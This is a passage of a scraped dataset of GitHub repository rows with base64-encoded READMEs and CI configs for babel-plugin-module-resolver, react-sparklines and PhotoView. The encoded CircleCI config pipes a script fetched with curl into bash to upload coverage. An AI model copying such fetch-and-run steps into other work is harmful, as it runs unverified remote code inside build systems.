YyBmaWxlcywgb3IgZXZlbiBvdGhlciBucG0gbW9kdWxlcy4KCiMjIERlc2Ny
aXB0aW9uCgpUaGlzIHBsdWdpbiBjYW4gc2ltcGxpZnkgdGhlIHJlcXVpcmUv
aW1wb3J0IHBhdGhzIGluIHlvdXIgcHJvamVjdC4gRm9yIGV4YW1wbGUsIGlu
c3RlYWQgb2YgdXNpbmcgY29tcGxleCByZWxhdGl2ZSBwYXRocyBsaWtlIGAu
Li8uLi8uLi8uLi91dGlscy9teS11dGlsc2AsIHlvdSBjYW4gd3JpdGUgYHV0
aWxzL215LXV0aWxzYC4gSXQgd2lsbCBhbGxvdyB5b3UgdG8gd29yayBmYXN0
ZXIgc2luY2UgeW91IHdvbid0IG5lZWQgdG8gY2FsY3VsYXRlIGhvdyBtYW55
IGxldmVscyBvZiBkaXJlY3RvcnkgeW91IGhhdmUgdG8gZ28gdXAgYmVmb3Jl
IGFjY2Vzc2luZyB0aGUgZmlsZS4KCmBgYGpzCi8vIFVzZSB0aGlzOgppbXBv
cnQgTXlVdGlsRm4gZnJvbSAndXRpbHMvTXlVdGlsRm4nOwovLyBJbnN0ZWFk
IG9mIHRoYXQ6CmltcG9ydCBNeVV0aWxGbiBmcm9tICcuLi8uLi8uLi8uLi91
dGlscy9NeVV0aWxGbic7CgovLyBBbmQgaXQgYWxzbyB3b3JrIHdpdGggcmVx
dWlyZSBjYWxscwovLyBVc2UgdGhpczoKY29uc3QgTXlVdGlsRm4gPSByZXF1
aXJlKCd1dGlscy9NeVV0aWxGbicpOwovLyBJbnN0ZWFkIG9mIHRoYXQ6CmNv
bnN0IE15VXRpbEZuID0gcmVxdWlyZSgnLi4vLi4vLi4vLi4vdXRpbHMvTXlV
dGlsRm4nKTsKYGBgCgojIyBHZXR0aW5nIHN0YXJ0ZWQKCkluc3RhbGwgdGhl
IHBsdWdpbgoKYGBgCiQgbnBtIGluc3RhbGwgLS1zYXZlLWRldiBiYWJlbC1w
bHVnaW4tbW9kdWxlLXJlc29sdmVyCmBgYAoKU3BlY2lmeSB0aGUgcGx1Z2lu
IGluIHlvdXIgYC5iYWJlbHJjYCB3aXRoIHRoZSBjdXN0b20gcm9vdCBvciBh
bGlhcy4gSGVyZSdzIGFuIGV4YW1wbGU6CmBgYGpzb24KewogICJwbHVnaW5z
IjogWwogICAgWyJtb2R1bGUtcmVzb2x2ZXIiLCB7CiAgICAgICJyb290Ijog
WyIuL3NyYyJdLAogICAgICAiYWxpYXMiOiB7CiAgICAgICAgInRlc3QiOiAi
Li90ZXN0IiwKICAgICAgICAidW5kZXJzY29yZSI6ICJsb2Rhc2giCiAgICAg
IH0KICAgIH1dCiAgXQp9CmBgYAoKKiouYmFiZWxyYy5qcyB2ZXJzaW9uKioK
U3BlY2lmeSB0aGUgcGx1Z2luIGluIHlvdXIgYC5iYWJlbHJjLmpzYCBmaWxl
IHdpdGggdGhlIGN1c3RvbSByb290IG9yIGFsaWFzLiBIZXJlJ3MgYW4gZXhh
bXBsZToKYGBgCgpjb25zdCBwbHVnaW5zID0gWwogIFsKICAgIHJlcXVpcmUu
cmVzb2x2ZSgnYmFiZWwtcGx1Z2luLW1vZHVsZS1yZXNvbHZlcicpLAogICAg
ewogICAgICByb290OiBbIi4vc3JjLyJdLAogICAgICBhbGlhczogewogICAg
ICAgICJ0ZXN0IjogIi4vdGVzdCIKICAgICAgfQogICAgfQogICAgCiAgXQoK
XTsKCmBgYApHb29kIGV4YW1wbGU6IC8vIGh0dHBzOi8vZ2lzdC5naXRodWIu
Y29tL25vZGt6LzQxZTE4OWZmMjIzMjVhMjdmZTZhNWNhODFkZjJjYjkxCgoK
IyMgRG9jdW1lbnRhdGlvbgoKYmFiZWwtcGx1Z2luLW1vZHVsZS1yZXNvbHZl
ciBjYW4gYmUgY29uZmlndXJlZCBhbmQgY29udHJvbGxlZCBlYXNpbHksIGNo
ZWNrIHRoZSBbZG9jdW1lbnRhdGlvbl0oRE9DUy5tZCkgZm9yIG1vcmUgZGV0
YWlscwoKQXJlIHlvdSBhIHBsdWdpbiBhdXRob3IgKGUuZy4gSURFIGludGVn
cmF0aW9uKT8gV2UgaGF2ZSBbZG9jdW1lbnRlZCB0aGUgZXhwb3NlZCBmdW5j
dGlvbnNdKERPQ1MubWQjZm9yLXBsdWdpbi1hdXRob3JzKSBmb3IgdXNlIGlu
IHlvdXIgcGx1Z2lucyEKCiMjIEVTTGludCBwbHVnaW4KCklmIHlvdSdyZSB1
c2luZyBFU0xpbnQsIHlvdSBzaG91bGQgdXNlIFtlc2xpbnQtcGx1Z2luLWlt
cG9ydF1bZXNsaW50LXBsdWdpbi1pbXBvcnRdLCBhbmQgW2VzbGludC1pbXBv
cnQtcmVzb2x2ZXItYmFiZWwtbW9kdWxlXVtlc2xpbnQtaW1wb3J0LXJlc29s
dmVyLWJhYmVsLW1vZHVsZV0gdG8gcmVtb3ZlIGZhbHN5IHVucmVzb2x2ZWQg
bW9kdWxlcy4gSWYgeW91IHdhbnQgdG8gaGF2ZSB3YXJuaW5ncyB3aGVuIGFs
aWFzZWQgbW9kdWxlcyBhcmUgYmVpbmcgaW1wb3J0ZWQgYnkgdGhlaXIgcmVs
YXRpdmUgcGF0aHMsIHlvdSBjYW4gdXNlIFtlc2xpbnQtcGx1Z2luLW1vZHVs
ZS1yZXNvbHZlcl0oaHR0cHM6Ly9naXRodWIuY29tL0hlcm9Qcm90YWdvbmlz
dC9lc2xpbnQtcGx1Z2luLW1vZHVsZS1yZXNvbHZlcikuIAoKIyMgRWRpdG9y
cyBhdXRvY29tcGxldGlvbgoKLSBBdG9tOiBVc2VzIFthdG9tLWF1dG9jb21w
bGV0ZS1tb2R1bGVzXVthdG9tLWF1dG9jb21wbGV0ZS1tb2R1bGVzXSBhbmQg
ZW5hYmxlIHRoZSBgYmFiZWwtcGx1Z2luLW1vZHVsZS1yZXNvbHZlcmAgb3B0
aW9uLgotIEludGVsbGlKL1dlYlN0b3JtOiBZb3UgY2FuIGFkZCBjdXN0b20g
cmVzb3VyY2VzIHJvb3QgZGlyZWN0b3JpZXMsIG1ha2Ugc3VyZSBpdCBtYXRj
aGVzIHdoYXQgeW91IGhhdmUgaW4gdGhpcyBwbHVnaW4uCi0gVlMgQ29kZTog
Q29uZmlndXJlIHRoZSBbcGF0aCBtYXBwaW5nXShodHRwczovL3d3dy50eXBl
c2NyaXB0bGFuZy5vcmcvZG9jcy9oYW5kYm9vay9tb2R1bGUtcmVzb2x1dGlv
bi5odG1sI3BhdGgtbWFwcGluZykgaW4gYGpzY29uZmlnLmpzb25gIChgdHNj
b25maWcuanNvbmAgZm9yIFR5cGVTY3JpcHQpLCBlLmcuOgoKYGBganMKewog
ICJjb21waWxlck9wdGlvbnMiOiB7CiAgICAiYmFzZVVybCI6ICIuIiwKICAg
ICJwYXRocyI6IHsKICAgICAgIioiOiBbInNyYy8qIl0sCiAgICAgICJ0ZXN0
LyoiOiBbInRlc3QvKiJdLAogICAgICAidW5kZXJzY29yZSI6IFsibG9kYXNo
Il0KICAgIH0KICB9Cn0KYGBgCgoKIyMgTGljZW5zZQoKTUlULCBzZWUgW0xJ
Q0VOU0UubWRdKC9MSUNFTlNFLm1kKSBmb3IgZGV0YWlscy4KCiMjIFdobyBp
cyB1c2luZyBiYWJlbC1wbHVnaW4tbW9kdWxlLXJlc29sdmVyID8KCi0gQWxn
b2xpYTogW0luc3RhbnRTZWFyY2guanNdKGh0dHBzOi8vZ2l0aHViLmNvbS9h
bGdvbGlhL2luc3RhbnRzZWFyY2guanMpCi0gQWlyYm5iOiBbTG90dGllIFJl
YWN0IE5hdGl2ZV0oaHR0cHM6Ly9naXRodWIuY29tL2FpcmJuYi9sb3R0aWUt
cmVhY3QtbmF0aXZlKQotIEFwcERpcmVjdAotIENhbGxzdGFjazogW1JlYWN0
IE5hdGl2ZSBQYXBlcl0oaHR0cHM6Ly9naXRodWIuY29tL2NhbGxzdGFjay9y
ZWFjdC1uYXRpdmUtcGFwZXIpCi0gQ29kaWxpdHkKLSBFbGVtZTogW0VsZW1l
bnRdKGh0dHBzOi8vZ2l0aHViLmNvbS9FbGVtZUZFL2VsZW1lbnQpIAotIEV4
cG86IFtFeHBvIFNES10oaHR0cHM6Ly9naXRodWIuY29tL2V4cG8vZXhwby90
cmVlL21hc3Rlci9wYWNrYWdlcy9iYWJlbC1wcmVzZXQtZXhwbykKLSBGb3Jt
aWRhYmxlTGFiczogW1ZpY3RvcnkgTmF0aXZlXShodHRwczovL2dpdGh1Yi5j
b20vRm9ybWlkYWJsZUxhYnMvdmljdG9yeS1uYXRpdmUpCi0gT3BlbkNvbGxl
Y3RpdmU6IFtPcGVuQ29sbGVjdGl2ZV0oaHR0cHM6Ly9naXRodWIuY29tL29w
ZW5jb2xsZWN0aXZlL2Zyb250ZW5kKQotIFJlYWN0IENvbW11bml0eTogW1Jl
YWN0IE5hdGl2ZSBNYXBzXShodHRwczovL2dpdGh1Yi5jb20vcmVhY3QtY29t
bXVuaXR5L3JlYWN0LW5hdGl2ZS1tYXBzKQotIFViZXI6IFtTZWVyXShodHRw
czovL2dpdGh1Yi5jb20vdWJlci13ZWIvU2VlciksIFtyZWFjdC12aXNdKGh0
dHBzOi8vZ2l0aHViLmNvbS91YmVyL3JlYWN0LXZpcykKLSBWdWV0aWZ5Lmpz
IFtWdWV0aWZ5XShodHRwczovL2dpdGh1Yi5jb20vdnVldGlmeWpzL3Z1ZXRp
ZnkpCi0gWmVpdDogW05leHQuanNdKGh0dHBzOi8vZ2l0aHViLmNvbS96ZWl0
L25leHQuanMpCi0gWmVuaWthOiBbSW1tdXRhZG90XShodHRwczovL2dpdGh1
Yi5jb20vWmVuaWthL2ltbXV0YWRvdCkKCkFyZSB5b3UgYWxzbyB1c2luZyBp
dD8gU2VuZCBhIFBSIQoKW3N0YXR1cy1pbWFnZV06IGh0dHBzOi8vaW1nLnNo
aWVsZHMuaW8vYmFkZ2Uvc3RhdHVzLW1haW50YWluZWQtYnJpZ2h0Z3JlZW4u
c3ZnCltzdGF0dXMtdXJsXTogaHR0cHM6Ly9naXRodWIuY29tL3RsZXVuZW4v
YmFiZWwtcGx1Z2luLW1vZHVsZS1yZXNvbHZlcgoKW25wbS1pbWFnZV06IGh0
dHBzOi8vaW1nLnNoaWVsZHMuaW8vbnBtL3YvYmFiZWwtcGx1Z2luLW1vZHVs
ZS1yZXNvbHZlci5zdmcKW25wbS11cmxdOiBodHRwczovL3d3dy5ucG1qcy5j
b20vcGFja2FnZS9iYWJlbC1wbHVnaW4tbW9kdWxlLXJlc29sdmVyCgpbY2ly
Y2xlY2ktaW1hZ2VdOiBodHRwczovL2ltZy5zaGllbGRzLmlvL2NpcmNsZWNp
L3Byb2plY3QvdGxldW5lbi9iYWJlbC1wbHVnaW4tbW9kdWxlLXJlc29sdmVy
L21hc3Rlci5zdmc/bG9nbz1kYXRhJTNBaW1hZ2UlMkZzdmclMkJ4bWwlM0Ji
YXNlNjQlMkNQSE4yWnlCNGJXeHVjejBpYUhSMGNEb3ZMM2QzZHk1M015NXZj
bWN2TWpBd01DOXpkbWNpSUhodGJHNXpPbmhzYVc1clBTSm9kSFJ3T2k4dmQz
ZDNMbmN6TG05eVp5OHhPVGs1TDNoc2FXNXJJaUIyYVdWM1FtOTRQU0l0TVRR
eUxqVWdMVEUwTWk0MUlESTROU0F5T0RVaVBqeGphWEpqYkdVZ2NqMGlNVFF4
TGpjaUlHWnBiR3c5SWlORVJEUTRNVFFpTHo0OFp5QnBaRDBpWVNJZ1ptbHNi
RDBpSTBaR1JpSSUyQlBHTnBjbU5zWlNCamVEMGlMVGsyTGpRaUlISTlJakU0
TGpraUx6NDhjR0YwYUNCa1BTSk5MVFExTGpZZ05qZ3VOR010TVRZdU5pMHhN
UzB5T1MweU9DMHpOQzAwTnk0NElEWXROU0E1TGpndE1USXVNeUE1TGpndE1q
QXVObk10TXk0NExURTFMamN0T1M0NExUSXdMalpqTlMweE9TNDRJREUzTGpR
dE16WXVOeUF6TkMwME55NDRiREV6TGpnZ01qTXVNa010TkRZdE16VXVNaTAx
TlM0ekxURTRMamN0TlRVdU15QXdZekFnTVRndU55QTVMak1nTXpVdU1pQXlN
eTQxSURRMUxqSjZJaTglMkJQQzluUGp4MWMyVWdlR3hwYm1zNmFISmxaajBp
STJFaUlIUnlZVzV6Wm05eWJUMGljbTkwWVhSbEtERXlNQ2tpTHo0OGRYTmxJ
SGhzYVc1ck9taHlaV1k5SWlOaElpQjBjbUZ1YzJadmNtMDlJbkp2ZEdGMFpT
Z3lOREFwSWk4JTJCUEM5emRtYyUyQgpbY2lyY2xlY2ktdXJsXTogaHR0cHM6
Ly9jaXJjbGVjaS5jb20vZ2gvdGxldW5lbi9iYWJlbC1wbHVnaW4tbW9kdWxl
LXJlc29sdmVyCgpbYXBwdmV5b3ItaW1hZ2VdOiBodHRwczovL2ltZy5zaGll
bGRzLmlvL2FwcHZleW9yL2NpL3RsZXVuZW4vYmFiZWwtcGx1Z2luLW1vZHVs
ZS1yZXNvbHZlci9tYXN0ZXIuc3ZnP2xvZ289ZGF0YSUzQWltYWdlJTJGc3Zn
JTJCeG1sJTNCYmFzZTY0JTJDUEhOMlp5QjRiV3h1Y3owaWFIUjBjRG92TDNk
M2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaUlIWmxjbk5wYjI0OUlqRXVNU0ln
ZDJsa2RHZzlJakV5T0NJZ2FHVnBaMmgwUFNJeE1qZ2lJSFpwWlhkQ2IzZzlJ
akFnTUNBeE1qZ2dNVEk0SWo0OFp5Qm1hV3hzUFNJak1VSkJNVVV5SWlCMGNt
RnVjMlp2Y20wOUluTmpZV3hsS0RncElqNDhjR0YwYUNCa1BTSk5NQ0F5TGpJ
Mk5XdzJMalV6T1MwdU9EZzRMakF3TXlBMkxqSTRPQzAyTGpVek5pNHdNemQ2
SWk4JTJCUEhCaGRHZ2daRDBpVFRZdU5UTTJJRGd1TXpsc0xqQXdOU0EyTGpJ
NU15MDJMalV6TmkwdU9EazJkaTAxTGpRMGVpSXZQanh3WVhSb0lHUTlJazAz
TGpNeU9DQXhMakkyTVd3NExqWTNMVEV1TWpZeGRqY3VOVGcxYkMwNExqWTNM
akEyT1hvaUx6NDhjR0YwYUNCa1BTSk5NVFlnT0M0ME5EbHNMUzR3TURJZ055
NDFOVEV0T0M0Mk55MHhMakl5TFM0d01USXROaTR6TkRWNklpOCUyQlBDOW5Q
and2YzNablBnPT0KW2FwcHZleW9yLXVybF06IGh0dHBzOi8vY2kuYXBwdmV5
b3IuY29tL3Byb2plY3QvdGxldW5lbi9iYWJlbC1wbHVnaW4tbW9kdWxlLXJl
c29sdmVyCgpbY292ZXJhZ2UtaW1hZ2VdOiBodHRwczovL2NvZGVjb3YuaW8v
Z2gvdGxldW5lbi9iYWJlbC1wbHVnaW4tbW9kdWxlLXJlc29sdmVyL2JyYW5j
aC9tYXN0ZXIvZ3JhcGgvYmFkZ2Uuc3ZnCltjb3ZlcmFnZS11cmxdOiBodHRw
czovL2NvZGVjb3YuaW8vZ2gvdGxldW5lbi9iYWJlbC1wbHVnaW4tbW9kdWxl
LXJlc29sdmVyCgpbZXNsaW50LWltcG9ydC1yZXNvbHZlci1iYWJlbC1tb2R1
bGVdOiBodHRwczovL2dpdGh1Yi5jb20vdGxldW5lbi9lc2xpbnQtaW1wb3J0
LXJlc29sdmVyLWJhYmVsLW1vZHVsZQpbZXNsaW50LXBsdWdpbi1pbXBvcnRd
OiBodHRwczovL2dpdGh1Yi5jb20vYmVubW9zaGVyL2VzbGludC1wbHVnaW4t
aW1wb3J0ClthdG9tLWF1dG9jb21wbGV0ZS1tb2R1bGVzXTogaHR0cHM6Ly9n
aXRodWIuY29tL25rdC9hdG9tLWF1dG9jb21wbGV0ZS1tb2R1bGVzCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"dmVyc2lvbjogMgpqb2JzOgogIHRlc3Rfd2l0aF9ub2RlXzY6CiAgICBkb2Nr
ZXI6CiAgICAgIC0gaW1hZ2U6IGNpcmNsZWNpL25vZGU6NgogICAgc3RlcHM6
CiAgICAgIC0gY2hlY2tvdXQKICAgICAgLSBydW46CiAgICAgICAgICBuYW1l
OiBJbnN0YWxsIGRlcGVuZGVuY2llcwogICAgICAgICAgY29tbWFuZDogbnBt
IGluc3RhbGwKICAgICAgLSBydW46CiAgICAgICAgICBuYW1lOiBUZXN0CiAg
ICAgICAgICBjb21tYW5kOiBucG0gdGVzdAogIHRlc3Rfd2l0aF9ub2RlXzg6
CiAgICBkb2NrZXI6CiAgICAgIC0gaW1hZ2U6IGNpcmNsZWNpL25vZGU6OAog
ICAgc3RlcHM6CiAgICAgIC0gY2hlY2tvdXQKICAgICAgLSBydW46CiAgICAg
ICAgICBuYW1lOiBJbnN0YWxsIGRlcGVuZGVuY2llcwogICAgICAgICAgY29t
bWFuZDogbnBtIGluc3RhbGwKICAgICAgLSBydW46CiAgICAgICAgICBuYW1l
OiBUZXN0CiAgICAgICAgICBjb21tYW5kOiBucG0gdGVzdAogIHRlc3Rfd2l0
aF9ub2RlXzk6CiAgICBkb2NrZXI6CiAgICAgIC0gaW1hZ2U6IGNpcmNsZWNp
L25vZGU6OQogICAgc3RlcHM6CiAgICAgIC0gY2hlY2tvdXQKICAgICAgLSBy
dW46CiAgICAgICAgICBuYW1lOiBJbnN0YWxsIGRlcGVuZGVuY2llcwogICAg
ICAgICAgY29tbWFuZDogbnBtIGluc3RhbGwKICAgICAgLSBydW46CiAgICAg
ICAgICBuYW1lOiBUZXN0CiAgICAgICAgICBjb21tYW5kOiBucG0gdGVzdAog
IHRlc3Rfd2l0aF9ub2RlXzEwOgogICAgZG9ja2VyOgogICAgICAtIGltYWdl
OiBjaXJjbGVjaS9ub2RlOjEwCiAgICBzdGVwczoKICAgICAgLSBjaGVja291
dAogICAgICAtIHJ1bjoKICAgICAgICAgIG5hbWU6IEluc3RhbGwgZGVwZW5k
ZW5jaWVzCiAgICAgICAgICBjb21tYW5kOiBucG0gaW5zdGFsbAogICAgICAt
IHJ1bjoKICAgICAgICAgIG5hbWU6IFRlc3QKICAgICAgICAgIGNvbW1hbmQ6
IG5wbSB0ZXN0CiAgICAgIC0gcnVuOgogICAgICAgICAgbmFtZTogRGVwbG95
IGNvdmVyYWdlCiAgICAgICAgICBjb21tYW5kOiBiYXNoIDwoY3VybCAtcyBo
dHRwczovL2NvZGVjb3YuaW8vYmFzaCkKICB0ZXN0X3dpdGhfbm9kZV8xMToK
ICAgIGRvY2tlcjoKICAgICAgLSBpbWFnZTogY2lyY2xlY2kvbm9kZToxMQog
ICAgc3RlcHM6CiAgICAgIC0gY2hlY2tvdXQKICAgICAgLSBydW46CiAgICAg
ICAgICBuYW1lOiBJbnN0YWxsIGRlcGVuZGVuY2llcwogICAgICAgICAgY29t
bWFuZDogbnBtIGluc3RhbGwKICAgICAgLSBydW46CiAgICAgICAgICBuYW1l
OiBUZXN0CiAgICAgICAgICBjb21tYW5kOiBucG0gcnVuIHRlc3Q6Y292ZXJh
Z2UKICAgICAgLSBydW46CiAgICAgICAgICBuYW1lOiBEZXBsb3kgY292ZXJh
Z2UKICAgICAgICAgIGNvbW1hbmQ6IGJhc2ggPChjdXJsIC1zIGh0dHBzOi8v
Y29kZWNvdi5pby9iYXNoKQp3b3JrZmxvd3M6CiAgdmVyc2lvbjogMgogIHRl
c3RfYWxsOgogICAgam9iczoKICAgICAgLSB0ZXN0X3dpdGhfbm9kZV82CiAg
ICAgIC0gdGVzdF93aXRoX25vZGVfOAogICAgICAtIHRlc3Rfd2l0aF9ub2Rl
XzkKICAgICAgLSB0ZXN0X3dpdGhfbm9kZV8xMAogICAgICAtIHRlc3Rfd2l0
aF9ub2RlXzExCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'react-sparklines',38173848,b'Beautiful and expressive Sparklines React component',b'JavaScript',56,2381,,2381,False,b'https://api.github.com/repos/borisyankov/react-sparklines/forks',"IyBCZWF1dGlmdWwgYW5kIGV4cHJlc3NpdmUgc3BhcmtsaW5lcyBjb21wb25l
bnQgZm9yIFJlYWN0CgpbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vdHJhdmlz
LWNpLm9yZy9ib3Jpc3lhbmtvdi9yZWFjdC1zcGFya2xpbmVzLnN2Zz9icmFu
Y2g9bWFzdGVyKV0oaHR0cHM6Ly90cmF2aXMtY2kub3JnL2JvcmlzeWFua292
L3JlYWN0LXNwYXJrbGluZXMpCgpMaXZlIGRlbW9zIGFuZCBkb2NzOiBbYm9y
aXN5YW5rb3YuZ2l0aHViLmlvL3JlYWN0LXNwYXJrbGluZXMvXShodHRwOi8v
Ym9yaXN5YW5rb3YuZ2l0aHViLmlvL3JlYWN0LXNwYXJrbGluZXMvKQoKIVtd
KGh0dHA6Ly9ib3Jpc3lhbmtvdi5naXRodWIuaW8vcmVhY3Qtc3BhcmtsaW5l
cy9pbWcvZHluYW1pYy5naWYpCgojIyBJbnN0YWxsCgpgYGAKbnBtIGluc3Rh
bGwgcmVhY3Qtc3BhcmtsaW5lcyAtLXNhdmUKYGBgCgojIyBSdW4gZGVtbwoK
YGBgCm5wbSBpbnN0YWxsCm5wbSBzdGFydApodHRwOi8vbG9jYWxob3N0Ojgw
ODAKYGBgCgoKIyMgVXNlCgpJbXBvcnQgdGhlIFNwYXJrbGluZXMgY29tcG9u
ZW50cyB0aGF0IHlvdSBuZWVkOyBmb3IgZXhhbXBsZSB0byBnZW5lcmF0ZSBh
IHNpbXBsZSBjaGFydDoKCiFbXShodHRwOi8vYm9yaXN5YW5rb3YuZ2l0aHVi
LmlvL3JlYWN0LXNwYXJrbGluZXMvaW1nL2Jhc2ljLnBuZykKCmBgYAppbXBv
cnQgUmVhY3QgZnJvbSAncmVhY3QnOwppbXBvcnQgeyBTcGFya2xpbmVzIH0g
ZnJvbSAncmVhY3Qtc3BhcmtsaW5lcyc7Ci4uLgo8U3BhcmtsaW5lcyBkYXRh
PXtbNSwgMTAsIDUsIDIwLCA4LCAxNV19IGxpbWl0PXs1fSB3aWR0aD17MTAw
fSBoZWlnaHQ9ezIwfSBtYXJnaW49ezV9Pgo8L1NwYXJrbGluZXM+CmBgYAoK
U3BhcmtsaW5lcyBjb21wb25lbnQgaXMgYSBjb250YWluZXIgd2l0aCB0aGUg
Zm9sbG93aW5nIHByb3BlcnRpZXM6CgpkYXRhIC0gdGhlIGRhdGEgc2V0IHVz
ZWQgdG8gYnVpbGQgdGhlIHNwYXJrbGluZQoKbGltaXQgLSBvcHRpb25hbCwg
aG93IG1hbnkgZGF0YSBwb2ludHMgdG8gZGlzcGxheSBhdCBvbmNlCgp3aWR0
aCwgaGVpZ2h0IC0gZGltZW5zaW9ucyBvZiB0aGUgZ2VuZXJhdGVkIHNwYXJr
bGluZSBpbiB0aGUgU1ZHIHZpZXdib3guICBUaGlzIHdpbGwgYmUgYXV0b21h
dGljYWxseSBzY2FsZWQgKGkuZS4gcmVzcG9uc2l2ZSkgaW5zaWRlIHRoZSBw
YXJlbnQgY29udGFpbmVyIGJ5IGRlZmF1bHQuCgpzdmdXaWR0aCwgc3ZnSGVp
Z2h0IC0gSWYgeW91IHdhbnQgYWJzb2x1dGUgZGltZW5zaW9ucyBpbnN0ZWFk
IG9mIGEgcmVzcG9uc2l2ZSBjb21wb25lbnQgc2V0IHRoZXNlIGF0dHJpYnV0
ZXMuCgpbcHJlc2VydmVBc3BlY3RSYXRpb10oaHR0cHM6Ly9kZXZlbG9wZXIu
bW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvU1ZHL0F0dHJpYnV0ZS9wcmVz
ZXJ2ZUFzcGVjdFJhdGlvKSAtIGRlZmF1bHQ6ICdub25lJywgc2V0IHRoaXMg
dG8gbW9kaWZ5IGhvdyB0aGUgc3BhcmtsaW5lIHNob3VsZCBzY2FsZSAKCm1h
cmdpbiAtIG9wdGlvbmFsLCBvZmZzZXQgdGhlIGNoYXJ0CgptaW4sIG1heCAt
IG9wdGlvbmFsLCBib3VuZCB0aGUgY2hhcnQKCgojIyMjIEJhc2ljIFNwYXJr
bGluZQoKIVtdKGh0dHA6Ly9ib3Jpc3lhbmtvdi5naXRodWIuaW8vcmVhY3Qt
c3BhcmtsaW5lcy9pbWcvY3VzdG9taXphYmxlLnBuZykKCmBgYAppbXBvcnQg
UmVhY3QgZnJvbSAncmVhY3QnOwppbXBvcnQgeyBTcGFya2xpbmVzLCBTcGFy
a2xpbmVzTGluZSB9IGZyb20gJ3JlYWN0LXNwYXJrbGluZXMnOwouLi4KPFNw
YXJrbGluZXMgZGF0YT17WzUsIDEwLCA1LCAyMF19PgogIDxTcGFya2xpbmVz
TGluZSBjb2xvcj0iYmx1ZSIgLz4KPC9TcGFya2xpbmVzPgpgYGAKCiMjIyMg
QmFycwoKIVtdKGh0dHA6Ly9ib3Jpc3lhbmtvdi5naXRodWIuaW8vcmVhY3Qt
c3BhcmtsaW5lcy9pbWcvYmFycy5wbmcpCgoKYGBgCmltcG9ydCBSZWFjdCBm
cm9tICdyZWFjdCc7CmltcG9ydCB7IFNwYXJrbGluZXMsIFNwYXJrbGluZXNC
YXJzIH0gZnJvbSAncmVhY3Qtc3BhcmtsaW5lcyc7Ci4uLgo8U3BhcmtsaW5l
cyBkYXRhPXtbNSwgMTAsIDUsIDIwXX0+CiAgPFNwYXJrbGluZXNCYXJzIC8+
CjwvU3BhcmtsaW5lcz4KYGBgCgojIyMjIFNwb3RzCgohW10oaHR0cDovL2Jv
cmlzeWFua292LmdpdGh1Yi5pby9yZWFjdC1zcGFya2xpbmVzL2ltZy9zcG90
cy5wbmcpCgoKYGBgCmltcG9ydCBSZWFjdCBmcm9tICdyZWFjdCc7CmltcG9y
dCB7IFNwYXJrbGluZXMsIFNwYXJrbGluZXNMaW5lLCBTcGFya2xpbmVzU3Bv
dHMgfSBmcm9tICdyZWFjdC1zcGFya2xpbmVzJzsKLi4uCjxTcGFya2xpbmVz
IGRhdGE9e3NhbXBsZURhdGF9PgogICAgPFNwYXJrbGluZXNMaW5lIHN0eWxl
PXt7IGZpbGw6ICJub25lIiB9fSAvPgogICAgPFNwYXJrbGluZXNTcG90cyAv
Pgo8L1NwYXJrbGluZXM+CmBgYAoKIyMjIyBSZWZlcmVuY2UgTGluZQoKIVtd
KGh0dHA6Ly9ib3Jpc3lhbmtvdi5naXRodWIuaW8vcmVhY3Qtc3BhcmtsaW5l
cy9pbWcvcmVmZXJlbmNlbGluZS5wbmcpCgoKYGBgCmltcG9ydCBSZWFjdCBm
cm9tICdyZWFjdCc7CmltcG9ydCB7IFNwYXJrbGluZXMsIFNwYXJrbGluZXNM
aW5lLCBTcGFya2xpbmVzUmVmZXJlbmNlTGluZSB9IGZyb20gJ3JlYWN0LXNw
YXJrbGluZXMnOwouLi4KPFNwYXJrbGluZXMgZGF0YT17c2FtcGxlRGF0YX0+
CiAgICA8U3BhcmtsaW5lc0xpbmUgLz4KICAgIDxTcGFya2xpbmVzUmVmZXJl
bmNlTGluZSB0eXBlPSJtZWFuIiAvPgo8L1NwYXJrbGluZXM+CmBgYAoKIyMj
IyBOb3JtYWwgQmFuZAoKIVtdKGh0dHA6Ly9ib3Jpc3lhbmtvdi5naXRodWIu
aW8vcmVhY3Qtc3BhcmtsaW5lcy9pbWcvbm9ybWFsYmFuZC5wbmcpCgoKYGBg
CmltcG9ydCBSZWFjdCBmcm9tICdyZWFjdCc7CmltcG9ydCB7IFNwYXJrbGlu
ZXMsIFNwYXJrbGluZXNMaW5lLCBTcGFya2xpbmVzTm9ybWFsQmFuZCB9IGZy
b20gJ3JlYWN0LXNwYXJrbGluZXMnOwouLi4KPFNwYXJrbGluZXMgZGF0YT17
c2FtcGxlRGF0YX0+CiAgICA8U3BhcmtsaW5lc0xpbmUgc3R5bGU9e3sgZmls
bDogIm5vbmUiIH19Lz4KICAgIDxTcGFya2xpbmVzTm9ybWFsQmFuZCAvPgo8
L1NwYXJrbGluZXM+CmBgYAo=
",,"bGFuZ3VhZ2U6IG5vZGVfanMKYmVmb3JlX2luc3RhbGw6IG5wbSBpbnN0YWxs
IC1nIG5wbUAzCnNjcmlwdDogdHJhdmlzX3JldHJ5IG5wbSB0ZXN0Cm5vZGVf
anM6Ci0gJzcnCnN1ZG86IGZhbHNlCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'PhotoView',40520570,b'\xe5\x9b\xbe\xe7\x89\x87\xe6\xb5\x8f\xe8\xa7\x88\xe7\xbc\xa9\xe6\x94\xbe\xe6\x8e\xa7\xe4\xbb\xb6',b'Java',90,2381,,2381,False,b'https://api.github.com/repos/bm-x/PhotoView/forks',"IyBQaG90b1ZpZXcg5Zu+54mH5rWP6KeI57yp5pS+5o6n5Lu2CgrkuIDkuKrm
tYHnlYXnmoRwaG90b3ZpZXcKCiMg5pWI5p6c5Zu+CiFbUGhvdG9WaWV3XSgu
